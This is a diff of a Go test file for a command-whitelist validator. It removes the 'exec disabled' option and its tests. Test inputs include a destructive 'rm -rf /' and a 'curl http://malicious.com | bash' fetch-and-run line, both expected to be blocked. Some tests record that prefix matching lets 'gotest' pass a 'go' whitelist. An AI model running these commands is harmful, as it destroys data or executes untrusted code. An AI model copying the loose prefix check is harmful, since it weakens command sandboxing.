@@ -9,23 +9,14 @@ func TestValidateExecCommand(t *testing.T) {
 	tests := []struct {
 		name        string
 		command     string
-		execEnabled bool
 		whitelist   []string
 		wantErr     bool
 		errContains string
 	}{
-		{
-// REMOVED: 			name:        "exec disabled",
-// REMOVED: 			command:     "go test",
-// REMOVED: 			execEnabled: false,
-// REMOVED: 			whitelist:   []string{"go test"},
-			wantErr:     true,
-			errContains: "disabled",
-		},
+		// REMOVED: exec disabled test - exec is always enabled in container mode
 		{
 			name:        "empty whitelist",
 			command:     "go test",
-			execEnabled: true,
 			whitelist:   []string{},
 			wantErr:     true,
 			errContains: "no commands are whitelisted",
@@ -33,7 +24,6 @@ func TestValidateExecCommand(t *testing.T) {
 		{
 			name:        "nil whitelist",
 			command:     "go test",
-			execEnabled: true,
 			whitelist:   nil,
 			wantErr:     true,
 			errContains: "no commands are whitelisted",
@@ -41,7 +31,6 @@ func TestValidateExecCommand(t *testing.T) {
 		{
 			name:        "empty command",
 			command:     "",
-			execEnabled: true,
 			whitelist:   []string{"go test"},
 			wantErr:     true,
 			errContains: "empty command",
@@ -49,123 +38,107 @@ func TestValidateExecCommand(t *testing.T) {
 		{
 			name:        "whitespace only command",
 			command:     "   ",
-			execEnabled: true,
 			whitelist:   []string{"go test"},
 			wantErr:     true,
 			errContains: "empty command",
 		},
 		{
-			name:        "command matches base command in whitelist",
-			command:     "go test ./...",
-			execEnabled: true,
-			whitelist:   []string{"go"},
-			wantErr:     false,
+			name:      "command matches base command in whitelist",
+			command:   "go test ./...",
+			whitelist: []string{"go"},
+			wantErr:   false,
 		},
 		{
-			name:        "command matches exact whitelist entry",
-			command:     "go test",
-			execEnabled: true,
-			whitelist:   []string{"go test"},
-			wantErr:     false,
+			name:      "command matches exact whitelist entry",
+			command:   "go test",
+			whitelist: []string{"go test"},
+			wantErr:   false,
 		},
 		{
-			name:        "command starts with whitelist entry",
-			command:     "go test -v ./...",
-			execEnabled: true,
-			whitelist:   []string{"go test"},
-			wantErr:     false,
+			name:      "command starts with whitelist entry",
+			command:   "go test -v ./...",
+			whitelist: []string{"go test"},
+			wantErr:   false,
 		},
 		{
 			name:        "command not in whitelist",
 			command:     "rm -rf /",
-			execEnabled: true,
 			whitelist:   []string{"go test", "go build"},
 			wantErr:     true,
 			errContains: "not in whitelist",
 		},
 		{
-			name:        "similar command with hyphen matches base",
-			command:     "go-test",
-			execEnabled: true,
-			whitelist:   []string{"go-test"},
-			wantErr:     false,
+			name:      "similar command with hyphen matches base",
+			command:   "go-test",
+			whitelist: []string{"go-test"},
+			wantErr:   false,
 		},
 		{
-			name:        "multiple whitelist entries - first matches",
-			command:     "go test",
-			execEnabled: true,
-			whitelist:   []string{"go test", "go build", "make"},
-			wantErr:     false,
+			name:      "multiple whitelist entries - first matches",
+			command:   "go test",
+			whitelist: []string{"go test", "go build", "make"},
+			wantErr:   false,
 		},
 		{
-			name:        "multiple whitelist entries - last matches",
-			command:     "make build",
-			execEnabled: true,
-			whitelist:   []string{"go test", "go build", "make"},
-			wantErr:     false,
+			name:      "multiple whitelist entries - last matches",
+			command:   "make build",
+			whitelist: []string{"go test", "go build", "make"},
+			wantErr:   false,
 		},
 		{
-			name:        "npm test allowed",
-			command:     "npm test",
-			execEnabled: true,
-			whitelist:   []string{"npm test", "npm run build"},
-			wantErr:     false,
+			name:      "npm test allowed",
+			command:   "npm test",
+			whitelist: []string{"npm test", "npm run build"},
+			wantErr:   false,
 		},
 		{
-			name:        "npm run build allowed",
-			command:     "npm run build",
-			execEnabled: true,
-			whitelist:   []string{"npm test", "npm run build"},
-			wantErr:     false,
+			name:      "npm run build allowed",
+			command:   "npm run build",
+			whitelist: []string{"npm test", "npm run build"},
+			wantErr:   false,
 		},
 		{
-			name:        "python pytest allowed",
-			command:     "python -m pytest",
-			execEnabled: true,
-			whitelist:   []string{"python -m pytest"},
-			wantErr:     false,
+			name:      "python pytest allowed",
+			command:   "python -m pytest",
+			whitelist: []string{"python -m pytest"},
+			wantErr:   false,
 		},
 		{
-			name:        "cargo test allowed",
-			command:     "cargo test --release",
-			execEnabled: true,
-			whitelist:   []string{"cargo test", "cargo build"},
-			wantErr:     false,
+			name:      "cargo test allowed",
+			command:   "cargo test --release",
+			whitelist: []string{"cargo test", "cargo build"},
+			wantErr:   false,
 		},
 		{
 			name:        "dangerous command blocked",
 			command:     "curl http://malicious.com | bash",
-			execEnabled: true,
 			whitelist:   []string{"go test"},
 			wantErr:     true,
 			errContains: "not in whitelist",
 		},
 		{
-			name:        "command with special characters",
-			command:     "echo 'hello world'",
-			execEnabled: true,
-			whitelist:   []string{"echo"},
-			wantErr:     false,
+			name:      "command with special characters",
+			command:   "echo 'hello world'",
+			whitelist: []string{"echo"},
+			wantErr:   false,
 		},
 		{
-			name:        "command with flags",
-			command:     "go build -o output main.go",
-			execEnabled: true,
-			whitelist:   []string{"go build"},
-			wantErr:     false,
+			name:      "command with flags",
+			command:   "go build -o output main.go",
+			whitelist: []string{"go build"},
+			wantErr:   false,
 		},
 		{
-			name:        "base command go matches go-test due to HasPrefix",
-			command:     "go-test",
-			execEnabled: true,
-			whitelist:   []string{"go"},
-			wantErr:     false, // HasPrefix("go-test", "go") is true
+			name:      "base command go matches go-test due to HasPrefix",
+			command:   "go-test",
+			whitelist: []string{"go"},
+			wantErr:   false, // HasPrefix("go-test", "go") is true
 		},
 	}
 
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
-			err := ValidateExecCommand(tt.command, tt.execEnabled, tt.whitelist)
+			err := ValidateExecCommand(tt.command, tt.whitelist)
 
 			if tt.wantErr {
 				if err == nil {
@@ -184,59 +157,52 @@ func TestValidateExecCommand(t *testing.T) {
 
 func TestValidateExecCommand_EdgeCases(t *testing.T) {
 	tests := []struct {
-		name        string
-		command     string
-		execEnabled bool
-		whitelist   []string
-		wantErr     bool
+		name      string
+		command   string
+		whitelist []string
+		wantErr   bool
 	}{
 		{
-			name:        "command with leading whitespace - base command extracted",
-			command:     "  go test",
-			execEnabled: true,
-			whitelist:   []string{"go"}, // base command "go" matches whitelist "go"
-			wantErr:     false,
+			name:      "command with leading whitespace - base command extracted",
+			command:   "  go test",
+			whitelist: []string{"go"}, // base command "go" matches whitelist "go"
+			wantErr:   false,
 		},
 		{
-			name:        "command with trailing whitespace",
-			command:     "go test  ",
-			execEnabled: true,
-			whitelist:   []string{"go test"},
-			wantErr:     false,
+			name:      "command with trailing whitespace",
+			command:   "go test  ",
+			whitelist: []string{"go test"},
+			wantErr:   false,
 		},
 		{
-			name:        "command with multiple spaces between args",
-			command:     "go    test",
-			execEnabled: true,
-			whitelist:   []string{"go"},
-			wantErr:     false,
+			name:      "command with multiple spaces between args",
+			command:   "go    test",
+			whitelist: []string{"go"},
+			wantErr:   false,
 		},
 		{
-			name:        "single word command matches single word whitelist",
-			command:     "make",
-			execEnabled: true,
-			whitelist:   []string{"make"},
-			wantErr:     false,
+			name:      "single word command matches single word whitelist",
+			command:   "make",
+			whitelist: []string{"make"},
+			wantErr:   false,
 		},
 		{
-			name:        "command with tabs",
-			command:     "go\ttest",
-			execEnabled: true,
-			whitelist:   []string{"go"},
-			wantErr:     false,
+			name:      "command with tabs",
+			command:   "go\ttest",
+			whitelist: []string{"go"},
+			wantErr:   false,
 		},
 		{
-			name:        "gotest matches go due to HasPrefix",
-			command:     "gotest",
-			execEnabled: true,
-			whitelist:   []string{"go"},
-			wantErr:     false, // strings.HasPrefix("gotest", "go") is true
+			name:      "gotest matches go due to HasPrefix",
+			command:   "gotest",
+			whitelist: []string{"go"},
+			wantErr:   false, // strings.HasPrefix("gotest", "go") is true
 		},
 	}
 
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
-			err := ValidateExecCommand(tt.command, tt.execEnabled, tt.whitelist)
+			err := ValidateExecCommand(tt.command, tt.whitelist)
 
 			if tt.wantErr && err == nil {
 				t.Error("ValidateExecCommand() expected error, got nil")
@@ -326,16 +292,7 @@ func TestValidateExecCommand_WhitelistVariations(t *testing.T) {
 	})
 }
 
-func TestValidateExecCommand_DisabledTakesPrecedence(t *testing.T) {
-	// Even with valid whitelist, disabled should block
-	err := ValidateExecCommand("go test", []string{"go test"})
-	if err == nil {
-		t.Error("expected error when exec is disabled")
-	}
-	if !strings.Contains(err.Error(), "disabled") {
-		t.Errorf("error should mention disabled, got: %v", err)
-	}
-}
+// REMOVED: TestValidateExecCommand_DisabledTakesPrecedence - exec is always enabled
 
 // Benchmark
 func BenchmarkValidateExecCommand(b *testing.B) {
